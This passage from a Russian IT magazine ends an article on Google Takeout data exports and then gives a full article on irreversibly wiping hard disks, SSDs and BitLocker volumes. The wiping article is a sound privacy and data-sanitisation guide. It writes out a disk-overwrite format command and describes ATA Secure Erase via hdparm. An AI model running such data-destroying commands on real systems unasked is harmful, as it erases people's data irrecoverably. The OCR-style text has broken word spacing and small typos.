ятно, когда их удавалось определить) нап равление движения в градусах,
высота в метрах и точность определения высоты.
   Что делать с этим фай лом, кроме как сохранить на память? Например,
можешь поупражняться в его анализе на Python или на R. Есть и спе циали‐
зированный софт для ковыря ния таких данных — Location History Visualizer Pro
(стоит 70 долларов), а также любительские сервисы вроде They Know Where
You’ve Been (если ты совсем уж не опа саешься делиться этими данными
со случайными людьми).





Однако сам сервис Google здесь пока что вне конкуренции. К Google Maps
прилагается утилита Timeline, где накопленные данные можно отсматривать
по дням, и здесь, помимо голых данных, которые выдаются через Takeout,
есть  всякая  аналитика.  Google,  нап ример, определяет  наз вания  мест
и заведений, которые ты посещал, и прекрасно различает транспортные
средства (и может легко понять, например, на мотоцикле ты передвигал ся,
на машине или на велосипеде).


CHROME
Это крайне интересная пап ка, которая содержит всю облачную часть Google
Chrome (а может быть, и не всю — никогда нель зя быть уверенным!). Вот что
в ней лежит.
 • Bookmarks.html — содержимое закладок в виде списка HTML. Рас‐
   парсить его не составит труда — знай хватай данные из a href и дели
   на секции по содержимому h3 . Для мно гих закладок указано время добав‐
   ления в формате Unix.
 • Dictionary.csv — по всей видимости, здесь должны быть исключения
   для проверки орфографии, которых у меня нет.
 • Extensions.json — данные об установленных рас ширениях.
 • SearchEngines.json — данные о допол нительных поисковиках. Если тебе
   когда‐нибудь понадобят ся правила составления поисковых запросов
   к разным поисковикам, этот файл как раз пригодится. В остальных слу‐
   чаях — вряд ли.
 • SyncSettings.json — настройки Chrome.
 • Autofill.json — в теории здесь должны быть данные для автоматического
   заполнения форм, но у меня только пустой массив. Похоже, если понадо‐
   бится, эти данные проще вытащить из самого Chrome.
 • BrowserHistory.json — честно говоря, я ожи дал увидеть в этой папке
   огромный кладезь личной информации: шутка ли — полный список всех
   сайтов, которые я когда‐либо открывал в Chrome! Однако меня ждало
   разочарование: в этом файле перечислены лишь четырнадцать ссылок,
   которые я успел открыть в мобильном Chrome, когда скачал его пос‐
   мотреть. На десктопе при этом внушительный спи сок сайтов и включена
   галочка Sync Everything. Глюк Takeout?

Если с последним пунктом тебе повезет больше, то ты с легкостью сможешь
проанализировать историю сво их перемещений по интернету. Google сох‐
раняет: тип перехода (по ссылке — LINK или напрямую — TYPED), заголовок
страницы, URL, ID клиента (полезно, что бы отличить свой дес ктоп от телефо‐
на и планшета) и время в формате Unix.


MY ACTIVITY
Это, пожалуй, одна из самых интересных папок, воз можно даже более инте‐
ресная, чем история поиска. Ее содержимое дает ответ на вопрос о том,
как именно Google следит за пользователями. Пройдясь по папкам, ты
можешь своими глазами увидеть, что он записывает каждые:
 • переход на сайт, аффилированный с Google Adwords;
 • книгу, открытую в Books;
 • сайт, на который ты ходил через Chrome;
 • использован ный API (папка Developers);
 • котировку, открытую в Finance;
 • запрос к Goggles (поиск объектов на снимке);
 • просмотр страницы в Google Play Store;
 • обращение к справке (папка Help);
 • запрос к Image Search и переход по ссылке;
 • просмотр объекта на карте (Maps);
 • поиск в Google News и чтение статьи на сайте‐источнике;
 • поисковый запрос и переход по ссылке из результатов (папка Search);
 • поиск товара или покуп ку в магазине (папка Shopping);
 • просмотр поездок в Google Trips;
 • поиск видео и переход из результатов (Video Search);
 • голосовой поиск (папка Voice and Audio);
 • поисковый запрос и просмотр роликов на YouTube.

Отмечу, что история сайтов Chrome у меня была такая же полупустая, как и
в папке самого Chrome, а раз дел Shopping вооб ще никуда не годится: за две‐
надцать лет Google едва отследил пару настоящих покупок. Тем не менее
массив  информации  очень  вну шительный.  Особенно  радуют  файлы
MP3 в папке Voice and Audio: ты можешь послушать собственный голос,
который произносит фра зы из серии «Окей, Гугл...».


        WWW

                   Всю ту же информацию ты можешь просматри‐
                         вать и фильтровать на сайте myactivity.google.‐
                   com. Там же можно удалить отдельные записи
                      и отключить отслеживание отдельных активнос‐
                          тей.


При этом формат, в котором все это выгружается, оставляет желать много
лучшего. Это снова HTML с не самой удобоваримой раз меткой и 150‐
килобайтным куском Material Design в каж дом файле. Я на скорую руку
сочинил вот такой скриптик на Python, который можно закинуть в любую
из папок и запустить.


import re
text = open('MyActivity.html', 'r').read()
result = re.findall(r'body‐1">(.+?)</div>', text)
for r in result:
    for s in r.split('>'):
        print s.split('<')[0]

На выходе получишь очищен ный текст, который можно, например, отправлять
на вход grep или продолжить структурировать даль ше. В общем, огромное
поле для деятельности.


ОСТАЛЬНЫЕ ПРОДУКТЫ
Подробно разбирать данные четырех десятков продуктов мы не будем,
но вкратце все же прой демся по оставшимся сервисам.
  +1 — HTML со списком страниц, которые ты когда‐либо лайкал через
Google+. В моем случае — четыре рандомные страницы.
  Bookmarks — то же самое, но для закладок. У меня по невы ясненным
причинам здесь оказались исключитель но закладки из Google Maps — то есть
звездочки, которыми можно отметить мес то на карте. Формат — HTML
со ссылками на Google Maps. Открыв его в редакторе, можно допол нительно
вытащить время добавления и в некоторых случаях — геокоординаты. Все эти
данные, впрочем, пол ностью продублирова ны в папке Maps (your places),
и в более удобном виде.
   Calendar — пользовательские кален дари из Google Calendar в формате
iCalendar  (.ics), который поддерживается мно гими  программами‐кален‐
дарями (в том числе Outlook, Thunderbird и эппловский Calendar). Так что их
можно импортировать нап рямую.
  Photos. Если ты активно пользуешься Photos, то в этой папке будет
огромный список подкатало гов — по одному на каждый день, на который
приходится хоть один снимок. Хорошая новость заключается в том, что все
фотографии хранятся и выгружа ются в их исходном формате, даже если
это огромные RAW. И (что немало важно) даже если ты используешь бесплат‐
ную версию Photos, где вроде бы присутству ет ограниче ние на качество
снимков. К каждому снимку прилага ется JSON с метаданными.
  YouTube. В первую очередь ты здесь най дешь все ролики, которые ког‐
да‐либо загружал на YouTube. Так же, как и фотографии, — в их исходных
форматах. И конечно, к каж дому прилага ется JSON с метаданными. Также
есть плей‐листы, подписки в формате OPML, история просмотров и поисков
в HTML (аналог того, что мы видели в My Activity ) и даже комментарии —
тоже в HTML.
   Classic Sites — сайты, соз данные при помощи не особенно популярного
сервиса Google Sites (что‐то среднее между narod.ru и Wikia). Я когда‐то дав‐
но сделал пару тестовых сайтов, после чего не трогал сервис годами. Тем
не менее они до сих пор существуют и экспортируются через Takeout. Перек‐
рестные ссылки работают локально, а вот картинки остаются на сервере
Google. И внутрь страниц лучше не заглядывать — вместо исходников ты уви‐
дишь горы оптимизированного JS в худших традици ях Google.
   Drive — все документы из Google Drive. Текст экспортируется как DOCX,
таблицы — XLSX, ком мента рии — как HTML с теми же названиями, что
и документ. Удобно, что названия файлов соответствуют заголовкам и струк‐
тура папок тоже сохраняется.
  Google Pay. Информация из этого сервиса раз делена на две папки.
Google Pay Send — список транзакций, про изведенных через Google Pay (у
меня — пустой файл CSV), и Google Pay rewards, gift cards, offers (у
меня — пустой PDF).
   Mail — полный архив писем Gmail. В папке лежит всего один файл — All
mail Including Spam and Trash.mbox. Его заголо вок говорит сам за себя:
это вся‐вся почта, включая спам и мусор. Формат — Mbox, то есть, по сути,
огромный текстовый файл, где подряд идут все письма с заголовками. Его
несложно импортировать в большинство почтовиков, но гораздо проще
будет подключить их непосредс твенно к Gmail и по IMAP выкачать только нуж‐
ные папки. Takeout тут пригодится раз ве что в том случае, если ты захочешь
забрать вообще все одним махом и  так в виде архи ва и сохранить
на будущее.
  Google My Business — здесь в моем случае вообще ничего интерес‐
ного, только JSON буквально из трех строчек: номер аккаунта, имя и фамилия
и пометка personal.
   Contacts — адресная книга из Gmail. Контакты разбиты на папки по груп‐
пам, плюс есть папка All Contacts, которая объединяет (и дуб лирует) содер‐
жимое остальных. Внутри каждой пап ки — файл vCard и картинки с юзер‐
пиков. Забавный эффект — тут картинки отоб ражаются целиком, в том виде,
в котором их загружали в Google. То есть если кто‐то поместил свое лицо
в кружок и решил, что остальное никто никогда не увидит, то он ошибается.
  G Suite Marketplace — пла гины для при ложений Google, которые ты
выставлял в фирменный магазин. Я не выставлял, поэтому у меня лишь один
файл — readme.
  Tasks — вот уже десять лет в глубинах Google существует сервис, пред‐
назначенный для ведения списков дел. Встретить его можно, например,
в Gmail и Calendar. Здесь же ты можешь найти его «отгруз ку» в виде довольно
мудреной структуры в JSON.
  Google Play Books — увидев, что в этой папке лежат под каталоги с наз‐
ваниями книг, я уже было обра довался: неужели найден способ получать
копии книг, купленных в Play Books? Ха‐ха. Нет, конечно. Вместо этого в каж‐
дом из подкаталогов — HTML с названием книги, именем автора, временем,
когда книга была открыта пос ледний раз, внутренним ID Play Books и ссылкой.
Польза, конечно, сомнительная, но если книг много, то при желании можно
вытащить их список, взяв названия и имена авто ров из элементов с классами
header и author.
  Остается еще несколько про дуктов, по которым в моем архиве ничего
не было из‐за того, что я ими никог да не пользовался. Это Blogger, Classroom,
Fit, Play Music, Groups, Handsfree, Hangouts on Air, Keep, Search Contributions
и Voice. Пожалуй, наибольшее упущение — это Keep, но вот в этом репози‐
тории ты можешь найти готовый парсер для его данных.


ВЫВОДЫ
Получается,  что  самые  важные  архи вы,  помимо  почты,  фотографий
и документов, — это Searches, Location History, BrowserHistory.json из папки
Chrome и My Activity.
  Можно ли в итоге ска зать, что через Takeout выдают все личные данные?
Вряд ли. Отсутствуют как минимум ста рые сервисы, поддержка которых прек‐
ращена: нет ни данных Google Reader, ни волн из Wave. Зная Google, я с тру‐
дом верю, что все эти данные уничтожены. Скорее их убрали в холодное хра‐
нилище.
  В выгрузке Takeout при желании можно найти и другие пробелы. Отсутс‐
твие данных из десктопного Chrome я уже упо минал, но есть и менее очевид‐
ные вещи. Например, страница для онлай нового просмотра активностей
содержит не только поисковые зап росы, но и при вяз ку к мес ту, откуда ты их
делал. В папке My Activity ничего похожего пока нет.
  Однако, несмотря на все эти недочеты, сотрудникам Google стоит сказать
спасибо: редко когда раз работчики сервиса тратят столько уси лий на улуч‐
шение портатив ности данных и повышение прозрачности их сбора. В резуль‐
тате Takeout полезен не только для того, чтобы забрать свои вещички
и скрыться с ними, но и для самой раз ной ана литики.
ПРИВАТНОСТЬ
ЗАМЕТАЕМ
СЛЕДЫ


                                                                           Олег Афонин
                                                                                   Эксперт по мобильной
                                                                                 криминалистике компании
                                                                                     «Элкомсофт»
                                                                                          aoleg@voicecallcentral.com





    КАК УНИЧТОЖИТЬ ДАННЫЕ БЫСТРО
         И БЕЗВОЗВРАТНО





Уничтожать улики и заметать следы — удел не самых законо‐
послушных граждан. Мы же сегодня поговорим о том,
как гарантированно уда лить информацию с разнообразных
носителей в тех случаях, когда ты собираешься продать,
подарить или попросту выбросить диск, телефон или компь‐
ютер.


Скажу банальность: в раз ных типах устройств способы хранения информации
сильно различаются. Более того, отличаются и спо собы удаления записанных
данных. У пользователей «обычных дисков» — с вращающимися магнитны ми
пластинами и без шифрования — имен но уда ление (перезапись) данных
с других типов носите лей час то вызывает удив ление и непони мание. Поэтому
начнем с магнитных дисков.


КАК УНИЧТОЖИТЬ ИНФОРМАЦИЮ НА ЖЕСТКОМ ДИСКЕ
В этом разделе под термином «жесткий диск» мы будем понимать классичес‐
кое устройство с вращающимися плас тинами и движущимися электромаг‐
нитными головками чтения‐записи. Информация, записанная на пластину, так
и остается на ней вплоть до момента, когда данные будут перезаписаны.
   Традиционный способ уда ления данных с магнитных дисков — фор‐
матирование. К сожалению, при использовании Windows даже полное фор‐
матирование диска может привести к раз ным — и временами неожидан‐
ным — результатам.
   Так, если используется ОС на Windows XP (или еще более старая версия
Windows), при пол ном форматировании диска система вовсе не запишет нули
в каждый сектор. Вместо это го ОС всего лишь произведет поиск плохих сек‐
торов с помощью последовательного чтения данных. Поэтому, если ты
собираешься выбросить старый компь ютер, работа ющий под управлением
Windows  XP, фор матируй  диск  в  командной  строке,  задав  параметр
/p:<число проходов> . В этом слу чае команда format перезапишет содер‐
жимое диска нулями столько  раз, сколько задано параметром <число
проходов>. Пример:


$ format D: /fs:NTFS /p:1

Начиная с Windows Vista разработ чики Microsoft изме нили логику работы
команды полного форматиро вания. Теперь форматирование диска действи‐
тельно перезаписывает данные нулями, и параметр /p становится избы точ‐
ным.
  Собственно, для обычного пользователя, не страдающего паранойей,
на том все и заканчива ется. Пользователи же, более обычного озабоченные
безопасностью удаленных данных, могут вспомнить о существовавших пару
десятилетий назад методах (кстати, очень дорогих), которы ми на специаль‐
ном оборудовании можно попробовать вос становить данные, анализируя
остаточную намагниченность дорожек. Теоретичес кая идея метода в том,
чтобы обнаружить  следы информа ции,  которая была ранее  записана
на дорожке, анализируя слабую остаточную намагниченность (вари ация
метода — анализ краевой намаг ниченности, когда считывать пытаются дан‐
ные  из  промежутков  между  дорожками).  Метод  прекрасно  работал
для накопителей размером со шкаф и электро магнитами, которые могли сор‐
вать с военного кокарду. Заметно худшие результаты метод показы вал
на дисках с объемом в десятки мегабайт и совсем плохо работал с накопи‐
телями, объем которых приближался к гигабайту (нет, это не ошибка, здесь
речь именно о мегабайтах и гигабайтах).





  В теории следы остаточной намагниченности можно попробовать вос‐
  становить из областей, показанных желтым (источник:
  www.anandteth.com)

Для современных накопителей с высокой плот ностью записи, объ ем которых
измеряется в терабайтах, подтвержденных слу чаев успешного применения
данного метода нет, а для дисков, использующих «черепичную» запись SMR,
подход невозможен в прин ципе.





  В современных накопителях плотность записи данных слишком высока
  для того, чтобы метод сра ботал (источник: www.anandteth.com)

Впрочем, чтобы исключить даже теоретическую возможность его исполь‐
зования, достаточно переза писать диск не нулями, а некоторой пос ледова‐
тельностью данных — иног да не один раз.


АЛГОРИТМЫ ГАРАНТИРОВАННОГО УНИЧТОЖЕНИЯ ИНФОРМАЦИИ
Во многих организациях используются специаль ные процедуры для утилиза‐
ции устройств хранения информации, подразумевающие их санацию (без‐
возвратное уничтожение информации). Для уничтожения действительно сек‐
ретной информации применя ют дес труктивные методы, но для данных,
не представляющих осо бой ценности, допустимо использовать и програм‐
мные алгоритмы. Таких алго ритмов существу ет великое множество.
   Начнем, пожалуй, с широко известного, но неверно интерпретируемого
американского стандарта DoD 5220.22‐M. Большинство бес платных и ком‐
мерческих приложений, которые поддерживают этот стандарт, ссы лаются
на старую (действовавшую до 2006 года) его ревизию. Дей ствительно,
с 1995‐го по 2006‐й «военный» стандарт уничтожения информации раз решал
использовать метод перезаписи данных. Стандарт подразумевал трехкрат‐
ную перезапись диска. Первым про ходом выполнялась запись любого сим‐
вола, затем — его XOR‐комплимента и, наконец, в последнем проходе — слу‐
чайной последовательнос ти. Например, так:


01010101 > 10101010 > 11011010*
* случайные данные

В настоящее время военными этот алгоритм не используется; для санации
носители физически уничтожа ют или полностью размагничивают, что называ‐
ется, «в горниле ядерного взрыва». Однако для уничтожения несекретной
информации этот алгоритм до сих пор применяется в различных государс‐
твенных учреждениях США.
   Канадская полиция уничтожает несекретную информацию при помощи
утилиты DSX собственной раз работки. Утилита перезаписы вает данные
нулями, затем — единицами, пос ле чего записывает на диск последователь‐
ность данных, в которой закодирована информация о версии утилиты, дате
и времени уничтожения данных. Секретная информа ция все так же уничтожа‐
ется вместе с носителем.
  Примерно так:


00000000 > 11111111 > 10110101*
* предопределенная кодированная последовательность

Похожим образом предлага ет уничтожать информацию известный спе‐
циалист в области криптографии Брюс Шнайер. Предложенный им алгоритм
отличается от канадской разработки лишь тем, что третьим проходом
записывается не предопределенная пос ледова тельность данных, а псев‐
дослучайная. В момент публикации этот алгоритм, использующий генератор
случайных чисел для переза писи, подвергал ся критике как более медленный
в сравнении с алгоритмами, которые записывали пре допределенную пос‐
ледовательность данных. На сегодняшний (а также вчерашний и позавчераш‐
ний) день трудно себе предста вить процессор, который способна хоть
как‐нибудь нагрузить такая прос тая задача, но на момент публикации алго‐
ритма в 1993 году в ходу были процессоры класса i486, работавшие на час‐
тотах порядка 20–66 МГц…
  Примерно так:


00000000 > 11111111 > 10110101*
* псевдослучайные данные

В Германии для унич тожения несекретных данных принят несколько другой
подход.  Стандарт  BSI  Verschlusssachen‐IT‐Richtlinien  (VSITR)  поз воляет
использовать от двух до шести про ходов (в зависимос ти от классификации
информации), записывающих поочередно псевдослучайную пос ледователь‐
ность и ее XOR‐комплимент. Пос ледним про ходом записы вается пос ледова‐
тельность 01010101.
  Примерно так:


01101101* > 10010010** > 01010101
* псевдослучайная последовательность 1
** XOR‐комплимент псевдослучайной последовательности 1

Наконец, в качестве технического курьеза приведем алгоритм Питера Гут‐
мана,  предложив шего  переза пись  в  35  проходов.  Опубликованный
в 1996 году алгоритм был основан на теоретическом пред положе нии уровня
остаточного магнетизма в 5% и уже на момент пуб ликации выглядел всего
лишь теоретическим изыском. Тем не менее и этот алгоритм поддерживается
многими приложениями для уничтожения информации. Фактически же его
использование избыточно и совершенно бес смыс ленно; даже трехкратная
перезапись информации по любому из описанных выше алгоритмов даст точ‐
но такой же результат.
   Какой алгоритм использовать? Для современных (не старше 10–15 лет)
жестких дисков однократной переза писи псевдослучайной последователь‐
ностью более чем достаточно для надежного уничтожения информации. Все,
что делается сверх этого, способно лишь успо коить внутреннюю паранойю,
но никак не уменьшить вероятность успешно го восста новления информации.


ПРИЛОЖЕНИЯ ДЛЯ БЕЗОПАСНОГО УДАЛЕНИЯ ДАННЫХ С
МАГНИТНЫХ НОСИТЕЛЕЙ
Как мы выяснили, для безопас ного удаления данных с жес ткого диска
желательно перезаписать его содержимое случайной последовательностью
битов, но можно и вос пользоваться одним из существующих алгоритмов
по уничтожению данных. Проще всего это сделать при помощи одной из дос‐
тупных утилит. Трудность представляет лишь выбор качественного и при этом
бесплатного приложения, ведь утилитами класса Secure Erase под завязку
забиты многочисленные файловые архивы.
   Хорошо себя зарекомен довала программа DBAN. Приложение работает
исключительно в режиме загрузки (программа распространяется в качес тве
загрузочного образа, точнее — самораспаковывающегося архива, который
при запуске предложит этот образ соз дать) и поддерживает большинс тво
стандартов уничтожения данных. Открытый исходный код позволяет убедить‐
ся не только что программа делает именно то, что обещает, но и что
для генерации псевдослучайной пос ледова тельности использован правиль‐
ный генератор случайных цифр.





                          Darik’s Boot and Nuke (BDAN)

Альтернативный вариант — бесплатное, но проприетарное приложение CBL
Data Shredder. Приложение разработано специалис тами в области восста‐
новления данных и поддерживает большинс тво существующих стандартов
уничтожения информации. CBL также позволяет создать загрузочную флеш‐
ку, при помощи которой можно полностью очистить диск.





                   Утилита CBL для уничтожения данных



                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

    ЗАМЕТАЕМ СЛЕДЫ
                  КАК УНИЧТОЖИТЬ ДАННЫЕ БЫСТРО
                           И БЕЗВОЗВРАТНО





ДИСКИ С АППАРАТНЫМ ШИФРОВАНИЕМ
Иногда информацию нужно удалить быстро, букваль но мгновенно. Оче видно,
что сделать это на логичес ком уровне для маг нитного диска невозможно:
требуется полностью перезаписать весь объем информации, что может
занять многие часы работы. Однако решение сущес твует, и довольно давно:
это жесткие диски с шифрованием на аппа рат ном уровне. Стандартов аппа‐
ратного шифрования существует несколько, самые распространенные —
Opal и eDrive. Объединяет эти стандарты то, что при включении шифрования
все данные на таком жестком диске будут автоматичес ки зашифрованы
при записи и расшифрованы при чтении.
  Нас же сейчас интересует дру гая осо бенность таких дисков, а именно
мгновенное и безвозвратное уничтожение данных. Реализовано это через
стандартную команду ATA Secure Erase, которую можно выполнить с помощью
стандартной утилиты hdparm. Для магнитных накопителей, использующих
аппаратное шифрование, команда Secure Erase мгновенно уничтожит ключ
шифрования, так что рас шифровать записанную на дис ке информацию ста‐
нет нельзя. При использовании диском стойкого шифрования с ключом дли‐
ной от 128 бит расшифровать данные будет совершенно невоз можно.
   Кстати, использовать hdparm можно и на обычных, незашифрованных дис‐
ках. Правда, время работы команды будет мало отличаться от обычной посек‐
торной перезаписи содержимого диска — просто потому, что именно посек‐
торную перезапись она и выполнит.
  Впрочем, hdparm не панацея. Аппаратное шифрование используется
в основном в жестких дисках, предназна ченных для работы в спе цифических
условиях (корпорациях, хос тинго вых и облачных компаниях). Даже если ты
установишь такой жесткий диск в свой домашний компьютер и включишь
аппаратное шиф рование, есть вероятность, что команда Secure Erase не сра‐
ботает как надо из‐за особенностей BIOS. В домашних условиях исполь‐
зовать чисто аппаратное шифрование без поддержки со стороны операци‐
онной системы — не самое лучшее и далеко не самое надежное решение.
  Пожалуй, стоит упомянуть, что существу ет целый класс жес тких дисков,
которые поставляются с уже активированным шифрованием всего накопи‐
теля. Любая информация, которую запишут на такой диск, будет автоматичес‐
ки зашифрована криптографичес ким ключом. Если пользователь не уста‐
новит пароль, то криптогра фический ключ не будет зашиф рован и все данные
будут доступны сразу после инициализации накопителя.





  Принцип работы жесткого диска с аппа рат ным шифрованием, если
  пароль не задан (источник: ibm.com)

Если же пользователь уста новит пароль на диск, то при ини циализации диска
(только выключение и включение, но не сон или гибернация — на этой осо‐
бенности построен целый ряд атак на подобные дис ки) криптографический
ключ будет зашифрован паролем и доступ к данным будет невоз можен до тех
пор, пока ты не введешь пра вильный пароль.





  Принцип работы жесткого диска с аппа рат ным шифрованием с установ‐
  ленным паролем (источник: ibm.com)

Легко догадаться, что уничтожение крип тографичес кого ключа делает доступ
к данным невозможным. Да, ты смо жешь считать информацию с дис ка,
но расшифровать ее будет нельзя. На таких дисках команда ATA Secure Erase
в первую очередь унич тожа ет именно криптогра фический ключ и лишь затем
начинает затирать данные.
   Такие диски используются практичес ки во всех хостинговых и облачных
компаниях. Оче видно, что такое шифрование никак не защитит от атак на уже
загруженную систему. Его цель — предотвра тить несанкционированный дос‐
туп к информации при физичес ком извлечении дис ка, например если сервер
украдут.


САМОЕ НАДЕЖНОЕ УДАЛЕНИЕ ДАННЫХ
Рассмотренный выше спо соб с утилитой hdparm требует, чтобы диск под‐
держивал аппаратное шифрование, что далеко не факт для обычных пот‐
ребительских накопителей. В домашних условиях быстрее и надежнее всего
уничтожать информацию с зашифрованных разделов, для которых достаточно
затереть криптографичес кий ключ.
   Так, если твои данные хра нятся на зашифрованном разделе BitLocker, то
для их моментального уничтожения достаточно всего лишь отформатировать
раздел «быстрым» форматированием. Команда format в Windows корректно
распознает тома BitLocker как в версии для командной строки, так и в вари‐
анте с GUI. При фор матировании томов BitLocker, даже «быстром», уничтожа‐
ется криптографический ключ, что делает даль нейший дос туп к информации
невозможным.


             BitLockerОсо бен ности
Знаешь ли ты, что отключение шифрования на уже зашифрованном разделе
BitLocker не приводит к расшифровке данных? Если ты отключишь шиф‐
рование на разделе, который был защищен BitLocker, Windows всего лишь
сохранит криптографичес кий ключ для дос тупа к данным в откры том виде (а
не в зашифрован ном паролем или данными из модуля TPM). Новые операции
записи будут вестись в открытом виде, но сущес твующие данные будут сох‐
ранены как есть — прос то будут автоматически рас шифрованы при помощи
открытого криптографичес кого ключа. Если ты снова включишь шифрование
этого раздела, то криптографичес кий ключ будет немедленно зашифрован,
а данные, ранее записанные в незашифрованном виде, будут постепенно
зашифрованы в фоновом режиме.


Но и здесь не обошлось без засады. Даже если ключ шифрования от тома
BitLocker будет уничтожен в первые секунды, где‐то в дру гом мес те может
найтись его копия. За примерами далеко ходить не нужно: при автоматичес‐
кой активации шифрования при помощи BitLocker Device Protection ключ вос‐
становления доступа автоматически же загружается в облако OneDrive. Таким
образом, даже унич тожение ключа шиф рования не поможет.
  Используешь BitLocker? Зайди в учетную запись Microsoft и проверь, нет
ли там лишних ключей шифрования.


ТВЕРДОТЕЛЬНЫЕ НАКОПИТЕЛИ
Безвозвратно удалить данные с твердотельного накопителя SSD и проще,
и сложнее, чем с магнитного жесткого диска. Давай разберемся, что про‐
исходит внутри SSD‐накопителя при удалении данных.
  Ты наверняка слышал о том, что микросхемы памяти, использующиеся
в SSD‐накопителях, позволяют быстро считать информацию, не очень быстро
записать данные в чистый блок и совсем медленно записать информацию
в область, занятую другими данными. Нас сейчас интересует именно пос‐
леднее свойство SSD‐накопителей. Для того чтобы записать в ячейку данные,
контроллер накопителя должен будет сперва очис тить (стереть) данные
в этой ячейке, и только после этого станет воз можной операция записи. Пос‐
кольку процесс инициализации ячейки очень и очень небыстрый, произво‐
дители разработали ряд алго ритмов, бла года ря которым в распоряжении
контроллера всегда есть дос таточное количество пустых ячеек.
  А что произой дет, если операционная система захочет записать данные
в ячейку с определен ным адресом, но по этому адресу уже хранятся какие‐то
данные? В этом случае контроллер SSD выполнит моментальную подмену
адресов: нужный адрес будет наз начен другой, пус той ячейке, а занятый блок
получит другой адрес или вовсе уйдет в неадресуемый пул для последующей
фоновой очистки.





              Принцип работы «сборщика мусора» и Trim

При обычном использовании на диск записывается гораздо больше данных,
чем он способен вместить. Пул свобод ных ячеек со временем сокращается,
и в какой‐то момент контроллеру становится дос тупным лишь пул из неад‐
ресуемого пространства «запас ной» емкости. Эту проблему производители
решают при помощи механизма Trim, работающего совместно с операци‐
онной системой. Если пользователь уда ляет какой‐то файл, форматиру ет
диск или создает новый раздел, система передает контроллеру SSD
информацию о том, что определенные ячейки не содержат полезных данных
и могут быть очищены.
  Обрати внимание: в результате работы Trim сама опе рационная сис тема
не перезаписывает эти блоки и не стирает информа цию. Контроллеру все го
лишь передается массив адресов ячеек, которые не содержат полезной
информации. С это го момента контроллер может начать фоновый процесс
удаления данных из ячеек.
   Что  произойдет,  если  на  SSD‐диске  содержится  большой  объем
информации, а контрол леру поступила команда Trim на все содержимое дис‐
ка? Дальнейшее никак не зависит от действий пользователя или операци‐
онной системы: алго ритмы контроллера начнут очистку ненужных ячеек. А что
случится, если поль зователь (или злоумышленник) попытается считать дан‐
ные из ячеек, на которые уже поступила команда Trim, но которые еще не
были физически очищены?
   Здесь начинается самое интерес ное. Современные SSD определяют три
возможности:
 1. Non‐deterministic Trim: неопределенное сос тояние. Контрол лер может вер‐
   нуть фактические данные, нули или что‐то еще, причем результат может
   различаться между попытками (SATA Word 169 bit 0).
 2. Deterministic Trim (DRAT): контроллер гарантированно возвращает одно
   и то же значение (чаще всего, но не обязательно нули) для всех ячеек пос‐
   ле команды Trim (SATA Word 69 bit 14).
 3. Deterministic Read Zero after Trim (DZAT): гарантированное возвращение
   нулей после Trim (SATA Word 69 bit 5).

Определить, к какому типу относится твой SSD, можно при помощи все той
же команды hdparm:


$ sudo hdparm ‐I /dev/sda | grep ‐i trim
    * Data Set Management TRIM supported (limit 1 block)
    * Deterministic read data after TRIM

SSD первого типа в настоящее время практически не встречаются (хотя
до сих пор подобным поведением отли чаются накопи тели стандарта eMMC).
Как правило, для обыч ного использования про изводители предлагают дис ки
второго типа, а SSD с поддержкой DZAT предназна чены для использования
в составе многодисковых мас сивов.
  С практической точ ки зрения это означает только одно: сразу после уда‐
ления данных (хоть пофайлово, хоть форматированием, хоть переразбивкой
разделов) информация ста нет недос тупной для чтения как с компьютера, так
и на специальном стенде.
   Казалось бы, все просто? Нет, здесь есть крупный подвох, и даже не один.
   Во‐первых, уверен ли ты, что на твоей системе корректно функционирует
Trim? Дело в том, что Trim поддерживается на уровне опе рационной системы
начиная с Windows 7 и только при соблюдении ряда условий. Всех условий!
Во‐первых, диск дол жен быть подключен нап рямую (SATA, NVME); для подав‐
ляющего большинства внешних (USB) накопи телей Trim не поддержи вается
(бывают  исключения).  Во‐вторых,  Windows  поддерживает  Trim  только
для томов NTFS. Наконец, Trim должны поддерживать как драйверы, так
и BIOS компьютера. Про верить работос пособ ность Trim в Windows можно
командой


$ fsutil behavior query DisableDeleteNotify

Результат:
 • 0 — Trim вклю чен и работа ет корректно;
 • 1 — Trim неактивен.

Обрати внимание: для USB‐накопителей (внешних SSD) Trim с большой веро‐
ятностью не будет активен, хоть и может поддерживаться на уровне встро‐
енного в накопитель кон троллера.
  Еще один момент. Да, оста новить процесс фоновой сборки мусора невоз‐
можно: если на SSD‐накопитель пода ется питание, то контроллер будет про‐
должать уничтожать данные пос ле Trim независимо ни от чего. Однако дос‐
таточно извлечь из накопителя чипы памяти, и при помощи несложного стен‐
да данные с них можно считать. Да, у исследова теля будет сильнейшая голов‐
ная боль, связанная с физичес кой фрагмента цией ячеек из‐за переадре‐
сации блоков и сверх того — логической фрагмента ции данных. Тем не менее
решить такую проблему все‐таки можно.
   Что приводит нас к последнему пункту. Заметная часть емкости накопи‐
теля (в некоторых моделях — до 10%) отводит ся под резервный неадресу‐
емый пул. В теории ячейки в этом пуле должны очищаться; на практике из‐за
многочисленных  особенностей  реализации  и  ошибок  в  прошивках
это работает далеко не всегда и данные могут физически оставаться на мес‐
те даже после завершения очистки.
   Таким образом, ситуация с уда лением данных с SSD выглядит следующим
образом.
 1. Ты можешь мгновенно уда лить данные со встроенного SSD‐накопителя,
   просто отформатировав раз дел (используй NTFS в качестве новой фай‐
   ловой системы). Trim пометит бло ки как неиспользуемые, а контроллер
   постепенно удалит информа цию из этих ячеек.
 2. Если все прошло правильно, то никакими недеструктивными способами
  добраться до информации будет невозможно. Более того, если злоумыш‐
   ленник подключит диск к другому компьютеру или спе циализированному
   стенду, контрол лер SSD продолжит методично затирать ячейки.
 3. Если же из SSD извлекут микросхемы, то оставшиеся в ячейках данные
   удастся считать. Более того, даже если процесс очистки, казалось бы,
   завершен, в неадресу емом резервном пуле могут  остаться ячейки,
   в которых содержатся «удален ные» данные.

Как  полностью  и  надежно  уничтожить  содержимое  SSD‐накопителя?
К сожалению, это не один, а два раз ных вопроса. Пол ностью очистить содер‐
жимое SSD можно при помощи уже зна комой команды ATA Secure Erase,
которую можно выдать через hdparm. А вот «надеж но» — увы, остается лишь
надеяться на правильную реализацию Secure Erase раз работчиками контрол‐
лера. Практика показывает, что в некоторых слу чаях Secure Erase не произво‐
дит полной очистки ячеек из резервного пула (из‐за простейших ошибок
в прошивке). Таким обра зом, гарантию даст исклю чительно использование
криптоконтейнера: если уда ляется криптографический ключ, расшифровать
остатки содержимого будет практически невозможно. Но и здесь есть свои
но: о депонированных ключах мы уже говорили. Организации, работающие
с секретной информацией, и вовсе не признают иных способов очистки SSD,
кроме физического уничтожения носителя.


